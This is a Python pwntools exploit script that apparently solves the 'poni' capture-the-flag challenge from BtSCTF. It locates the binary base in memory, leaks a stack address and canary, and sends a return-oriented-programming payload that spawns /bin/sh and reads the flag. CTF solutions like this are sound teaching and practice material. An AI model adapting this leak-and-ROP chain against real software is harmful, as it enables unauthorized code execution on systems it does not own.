#!/usr/bin/env python3

from pwn import *

exe = ELF("./poni")

context.binary = exe
context.terminal = "alacritty -e".split()


def conn():
    if args.LOCAL:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=True, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    else:
        io = remote("127.0.0.1", 1337)
    return io


def main():
    io = conn()
    p = log.progress("loading")
    # Skip all the printed ponis.
    io.recvuntil(b"!!!\nponi")
    p.success("intro finished")

    # Size of the first allocation done internally by glibc.
    first_alloc_offset = 0x1860
    i = 1
    # Size of our executable.
    bin_size = 0xb1000
    # Offset to the beginning of the heap.
    heap_base = -first_alloc_offset

    # Search where the binary is in memory.
    # We do it in multiples of bin_size so it's not that hard to
    # find it.
    p = log.progress("searching for binary")
    while True:
        offset = heap_base - i*bin_size
        p.status(f"trying {i=} {offset=}")
        io.sendline(f"{offset}".encode())
        
        recieved = io.recvuntil(b"poni")
        if b":<" not in recieved:
            break
        
        heap_base -= 0x20 # malloc chunk size
        i += 1
    p.success(f"binary was found at offset {offset}")

    # Binary search for the base of the binary.
    l = offset - heap_base
    r = l + bin_size
    p = log.progress("searching for binary base")
    while l <= r:
        m = (l+r) // 2
        p.status(f"trying {l=} {r=} {m=}")
        io.sendline(f"{m}".encode())

        recieved = io.recvuntil(b"poni")
        if b":<" not in recieved:
            l = m+1
        else:
            r = m-1
        l -= 0x20
        r -= 0x20
    bin_base_offset = m - bin_size
    p.success(f"binary base found at {hex(bin_base_offset)=}")

    # Overwrite the mov instructions.
    bin_base_offset -= 0x20
    read_movl_offset = exe.sym['main']+3670+3 - exe.address
    io.sendline(f"{bin_base_offset+read_movl_offset}".encode())

    bin_base_offset -= 0x20
    write_movq_offset = exe.sym['main']+3627+4 - exe.address
    io.sendline(f"{bin_base_offset+write_movq_offset}".encode())

    io.recvuntil(b"poni", timeout=5)
    io.recv(21, timeout=5)
    stack = u64(io.recv(8), timeout=5)
    canary = u64(io.recv(8), timeout=5)
    info(f"stack: {hex(stack)}")
    info(f"canary: {hex(canary)}")

    rbp = p64(stack+0x20)
    # 0x0000000044c07e: pop rsi; ret;
    pop_rsi = 0x0000000044c07e
    # 0x0000000042c05c: pop rax; ret;
    pop_rax = 0x0000000042c05c
    # 0x0000000040478d: pop rdi; pop rbp; ret;
    pop_rdi_rbp = 0x0000000040478d
    # 0x000000004025cc: syscall;
    syscall = 0x000000004025cc
    
    payload = b"/bin/sh\x00".rjust(24, b"\xfa") + p64(canary) + rbp + \
        p64(pop_rsi) + p64(0) + \
        p64(pop_rax) + p64(0x3b) + \
        p64(pop_rdi_rbp) + p64(stack-0x20) + p64(0x6162) + \
        p64(syscall)
    io.sendline(payload)
    info("payload sent")
    io.sendlineafter(b"poni", f"{0xc0ffee}".encode())
    
    io.sendline(b"cat flag")
    io.sendline(b"cat flag")
    io.sendline(b"cat flag")

    ret = io.recvuntil(b"BtSCTF", timeout=5)
    assert b"BtSCTF" in ret
    exit(0)


if __name__ == "__main__":
    for _ in range(0x20):
        try:
            main()
        except Exception as e:
            print(f"exception: {e}")
    exit(-1)
